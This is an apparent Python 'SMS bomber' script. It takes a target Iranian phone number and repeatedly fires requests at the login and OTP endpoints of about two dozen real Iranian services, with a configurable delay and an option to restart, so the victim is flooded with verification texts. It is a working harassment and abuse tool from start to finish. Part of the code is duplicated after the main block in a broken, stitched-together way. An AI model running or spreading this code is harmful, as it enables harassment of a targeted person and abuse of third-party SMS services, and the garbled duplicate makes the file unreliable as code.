import requests
from termcolor import colored
import time


class ValidationError(Exception):
    """Validation error"""


class Bomber(object):
    def __init__(self, number: str, delay: float, timeout: float) -> None:
        self.number = number
        self.delay = delay
        self.timeout = timeout
    def sms(self):
        sites = [ # List of api's (that send message) with them dependencies
            [
            "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
                {
                    "source": "besina",
                    "mobile": self.number
                },
            ],

                       ["https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", {"cellphone": self.number.replace("0", "+98", 1)}],

            [
                "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", 
                    {"Parameters": {
                        "ApplicationType": "Web",
                        "ApplicationUniqueToken": "null",
                        "ApplicationVersion": "1.0.0",
                        "MobileNumber": self.number, 
                        "UniqueToken": "null"
                        }
                    }
                ],
  ["https://api.divar.ir/v5/auth/authenticate", {"phone": self.number.lstrip("0")}],
     [
                "https://virgool.io/api/v1.4/auth/verify",
                {
                    "method": "phone", 
                    "identifier": self.number.replace("0", "+98", 1), 
                    "type": "register"
                }
            ],
                [
                "https://core.gapfilm.ir/api/v3.1/Account/Login", 
                {
                    "Type": 3, 
                    "Username": self.number.lstrip("0"), 
                    "SourceChannel": "GF_WebSite", 
                    "SourcePlatform": "desktop", 
                    "SourcePlatformAgentType": "Chrome",
                    "SourcePlatformVersion": "111.0.0.0", 
                    "GiftCode": "null"
                }
            ],
                ["https://api.digikalajet.ir/user/login-register/", {"phone": self.number}],
                    [
                "https://api.tapsi.cab/api/v2.2/user",
                {
                    "credential": {"phoneNumber": self.number, "role": "PASSENGER"}, 
                    "otpOption": "SMS"
                }
            ],
      ["https://mobapi.banimode.com/api/v2/auth/request", {"phone": self.number}],
         [
                "https://www.hamrah-mechanic.com/api/v1/membership/otp",
                {
                    "PhoneNumber": self.number, 
                    "prevDomainUrl": "https://www.google.com/",
                    "landingPageUrl": "https://www.hamrah-mechanic.com/",
                    "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
                    "prevUrl": "https://www.hamrah-mechanic.com/", 
                    "referrer": "https://www.google.com/"
                }
            ],
                        ["https://www.miare.ir/api/otp/driver/request/", {"phone_number": self.number}],
            ["https://api.vandar.io/account/v1/check/mobile", {"mobile": self.number}],
            ["https://taraazws.jabama.com/api/v4/account/send-code", {"mobile": self.number}],

            [f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={self.number}", None],
 [
                "https://tikban.com/Account/LoginAndRegister",
                {
                    "phoneNumberCode": "+98", 
                    "CellPhone": self.number, 
                    "CaptchaKey": "null", 
                    "JustMobilephone": self.number.lstrip("0")
                }
            ],
                        ["https://www.buskool.com/send_verification_code", {"phone": self.number}],
 ["https://api.timcheh.com/auth/otp/send", {"mobile": self.number}],
            [f"https://core.gap.im/v1/user/add.json?mobile=%2B{self.number.replace('0', '+98', 1)}", "GET"],
            ["https://igame.ir/api/play/otp/send", {"phone": self.number}],
  [
                "https://gitamehr.ir/wp-admin/admin-ajax.php", 
                {
                    "action": "stm_login_register",
                    "type": "mobile",
                    "input":  self.number,
                }
            ],
                        [
                "https://titomarket.com/index.php?route=account/login_verify/verify", 
                {
                    "redirect": "https://titomarket.com/my-account",
                    "telephone": self.number.replace("0", "+98", 1)
                }
            ],

            ["https://shimashoes.com/api/customer/member/register/", { "email": self.number.replace("0", "+98", 1) + self.number}],
        ]

        success_counter = 0
        fail_counter = 0

        # dpc > dependency
        for url, dpc in sites:
            try:
                # If request method is get
                if dpc == "GET":
                    response = requests.get(url=url, timeout=self.timeout)
                # Else, request method must be post
                else:
                    response = requests.post(url=url, json=dpc, timeout=self.timeout)

                if response.status_code == 200: # If message sent successfully
                    success_counter += 1
                    print(colored(f"{url} >>> {response}", color="light_green"))
                else: # If message is not sent
                    fail_counter += 1
                    print(colored(f"{url} >>> {response}", color="light_red"))

                time.sleep(self.delay) # Delay between each message
            except (
                    requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout,
                    requests.exceptions.TooManyRedirects, requests.ConnectionError) as error:
                print(colored(f"{url} >>> {error}", "red"))
                continue

        return (
            success_counter, # Number of messages sent successfully 
            fail_counter #َ And those that failed
        )  


if __name__ == "__main__":
    try : # Getting data from terminal
        number = input("Enter target number (09123456789) >>> ")
        if not number.startswith("09"):
            raise ValidationError(f"Target number ({number}) is not a valid number!")
        if not len(number) == 11:
            raise ValidationError(f"Target number ({number}) must have 11 characters!")

        delay = float(input("Enter the delay between each requests >>> "))
        if delay < 0:
            raise ValidationError(f"Delay ({delay}) must be positive!")

        timeout = float(input("How long should each request take? >>> "))
        if timeout < 0:
            raise ValidationError(f"Timeout ({timeout}) must be positive!")
    except KeyboardInterrupt: # If user stopped the program (ctrl + c)
        print(colored("\nProgram STOPPED by user!", "red"))
        exit()

    bomb = Bomber(number, delay, timeout) # Create a bomber

    start = True
    while start:
        print(colored("####################\n  Program started :\n", "green"))
        try:
            success, fail = bomb.sms() # Start bombing
        except KeyboardInterrupt: # If user stopped the proccess of bombing
            print(colored("############################\n  Proccess STOPPED by user!", "red"))
            exit()
        else: # If proccess completed successfully (User did not stop it)
            print(colored("#######################\n  Proccess COMPLETED!\n#######################\n", "green"))
        print(colored(f"Number of successful messages : {success}", "green"))
        print(colored(f"Number of failed messages : {fail}", "red"))

        cont = input("Do you want to restart the proccess ? [Y/n]>>> ")
        if cont.lower().startswith("n") or cont == "0": start = False









        success_counter = 0
        fail_counter = 0

        # dpc > dependency
        for url, dpc in sites:
            try:
                # If request method is get
                if dpc == "GET":
                    response = requests.get(url=url, timeout=self.timeout)
                # Else, request method must be post
                else:
                    response = requests.post(url=url, json=dpc, timeout=self.timeout)

                if response.status_code == 200: # If message sent successfully
                    success_counter += 1
                    print(colored(f"{url} >>> {response}", color="light_green"))
                else: # If message is not sent
                    fail_counter += 1
                    print(colored(f"{url} >>> {response}", color="light_red"))

                time.sleep(self.delay) # Delay between each message
            except (
                    requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout,
                    requests.exceptions.TooManyRedirects, requests.ConnectionError) as error:
                print(colored(f"{url} >>> {error}", "red"))
                continue

        return (
            success_counter, # Number of messages sent successfully 
            fail_counter #َ And those that failed
        )  


if __name__ == "__main__":
    try : # Getting data from terminal
        number = input("Enter target number (09123456789) >>> ")
        if not number.startswith("09"):
            raise ValidationError(f"Target number ({number}) is not a valid number!")
        if not len(number) == 11:
            raise ValidationError(f"Target number ({number}) must have 11 characters!")

        delay = float(input("Enter the delay between each requests >>> "))
        if delay < 0:
            raise ValidationError(f"Delay ({delay}) must be positive!")

        timeout = float(input("How long should each request take? >>> "))
        if timeout < 0:
            raise ValidationError(f"Timeout ({timeout}) must be positive!")
    except KeyboardInterrupt: # If user stopped the program (ctrl + c)
        print(colored("\nProgram STOPPED by user!", "red"))
        exit()

    bomb = Bomber(number, delay, timeout) # Create a bomber

    start = True
    while start:
        print(colored("####################\n  Program started :\n", "green"))
        try:
            success, fail = bomb.sms() # Start bombing
        except KeyboardInterrupt: # If user stopped the proccess of bombing
            print(colored("############################\n  Proccess STOPPED by user!", "red"))
            exit()
        else: # If proccess completed successfully (User did not stop it)
            print(colored("#######################\n  Proccess COMPLETED!\n#######################\n", "green"))
        print(colored(f"Number of successful messages : {success}", "green"))
        print(colored(f"Number of failed messages : {fail}", "red"))

        cont = input("Do you want to restart the proccess ? [Y/n]>>> ")
        if cont.lower().startswith("n") or cont == "0": start = False

